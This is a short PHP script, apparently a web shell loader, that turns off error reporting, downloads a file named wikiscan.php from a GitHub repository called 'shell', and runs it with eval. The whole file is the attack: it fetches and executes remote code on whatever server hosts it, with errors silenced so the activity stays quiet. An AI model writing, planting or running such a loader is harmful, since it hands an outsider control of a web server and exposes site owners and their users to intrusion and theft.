<?php
error_reporting(0);
$url = 'https://raw.githubusercontent.com/aptisme/shell/refs/heads/main/wikiscan.php';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
